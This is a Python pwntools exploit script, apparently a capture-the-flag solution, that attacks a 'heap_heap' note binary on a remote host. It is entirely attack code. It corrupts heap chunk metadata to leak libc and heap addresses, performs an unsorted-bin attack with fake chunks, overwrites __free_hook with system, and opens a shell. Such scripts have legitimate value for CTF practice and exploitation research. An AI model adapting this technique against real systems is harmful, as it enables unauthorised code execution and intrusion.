#!/usr/bin/python3
from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./heap_heap"
#"""
HOST = "185.14.184.242"
PORT = 13990 
"""
HOST = "localhost"
PORT = 7777
#"""
if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
	#libc = ELF('./libc.so.6')
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')
else:
	conn = process(FILE_NAME)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')

elf = ELF(FILE_NAME)

off_malloc_hook = libc.symbols["__malloc_hook"]
off_free_hook = libc.symbols["__free_hook"]
off_unsorted = off_malloc_hook + 0x70
off_system = libc.symbols["system"]
gadget = 0xe6ce9

def create(size, title, s):
	conn.sendlineafter("> ", "1")
	conn.sendlineafter("> ", str(size-0x10))
	conn.sendafter("> ", title)
	conn.sendafter("> ", s)

def delete(idx):
	conn.sendlineafter("> ", "2")
	conn.sendlineafter("> ", str(idx))

def rewrite(idx, s):
	conn.sendlineafter("> ", "3")
	conn.sendlineafter("> ", str(idx))
	conn.sendafter("> ", s)

def show(idx):
	conn.sendlineafter("> ", "4")
	conn.sendlineafter("> ", str(idx))
	conn.recvuntil("story: ")

def exploit():
#	create(chunk_size - 0x8, title, data)

	create(0x1ef00 - 0x8, "A\n", "A\n")

	create(0x1d10 -0x8, "B\n", "B\n") # prepare overwrapped chunk
	delete(1)
	
	create(0x100 - 0x8, "C\n", "C\n")
	payload = b"c"*(0x100-0x18) + p64(0xc41) # overwrite size of top (0x1c41 -> 0xc41)
	rewrite(1, payload)
	
	create(0x8000 - 0x8 , "D\n", "D\n") # link top chunk to unsorted bin
	
	payload = b"c"*(0x100-0x8-1) + b"X"
	rewrite(1, payload) #overwrite size of unsorted chunk  to leak libc
	show(1)
	conn.recvuntil("X")
	
	libc_unsorted = conn.recvline()[:-1]
	libc_unsorted = u64(libc_unsorted+b"\x00"*(8-len(libc_unsorted)))
	libc_base = libc_unsorted - off_unsorted
	libc_malloc_hook = libc_base+off_malloc_hook
	libc_free_hook = libc_base+off_free_hook
	libc_system = libc_base + off_system
	
	payload = b"c"*(0x100-0x18) + p64(0xc21) # repair unsorted chunk
	payload += p64(libc_unsorted)
	payload += p64(libc_unsorted)
	rewrite(1, payload)
	create(0x420 - 0x8, "E\n", "E"*8) # cut chunk(0x420) from unsorted chunk (0xc20 -> 0x800) 

	show(4) # leak heap address which remains at [chunk+0x18]
	conn.recv(8)

	addr_heap = conn.recvline()[:-1]
	addr_heap = u64(addr_heap+b"\x00"*(8-len(addr_heap)))
	heap_base = addr_heap - 0x3b0 - 0x1c010 - 0x3000
	
	payload = b"c"*(0x100-0x18) + p64(0x421) 	# overwrite size of E
	payload += p64(addr_heap+0x420)				# fd = F 
	payload += p64(0)
	payload += b"c"*0x400
	payload += p64(0x420)						# fake prev_size
	payload += p64(0x801)						# unsorted chunk
	payload += p64(libc_unsorted)				 
	payload += p64(addr_heap)					# bk = E (unsorted bin attack)
	rewrite(1, payload) 
	
	# prepare fake chunk
	fake = b"\x00"*0xe8
	fake +=  p64(0x61)							# fake_sze
	fake +=  p64(addr_heap)						# fd = E
	fake +=  p64(addr_heap+0x420)				# bk = F
	conn.sendlineafter("> ",  fake) 
	fake = p64(0x60)							# fake prev_size
	fake += p64(0x20)							# fake next_size
	rewrite(0, fake)

	create(0x7f8, "F\n", "F\n")					
	# unsorted bin
	# fd = F 
	# bk = E 
	
	payload = b"c"*(0x100-0x18) + p64(0x421) 	# overwrite size of E 
	payload += p64(libc_unsorted)				# fd = unsorted bin 
	payload += p64(heap_base+0x380)				# bk = fake
	payload += b"c"*0x400
	payload += p64(0x420)						# fake prev_size
	payload += p64(0x100)						# overwrite size of F
	payload += p64(heap_base+0x380)				# fd = fake
	payload += p64(libc_unsorted)				# bk = unsorted bin
	payload += b"z"*0xe0
	payload += p64(0x100)						# fake prev_size
	payload += p64(0x20)						# fake next_sizek
	rewrite(1, payload) 
	
	payload = p64(0)
	payload += p64(0)
	payload += p64(libc_free_hook-0x8)			# buffer of get_int
	payload += p64(0)							# delete flag
	create(0x58, "/bin/sh\n", payload)

	fake = b"\x00"*8
	fake += p64(libc_system)
	conn.sendlineafter("> ",  fake)
	
	delete(6)
	print(hex(libc_base))
	print(hex(heap_base))
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
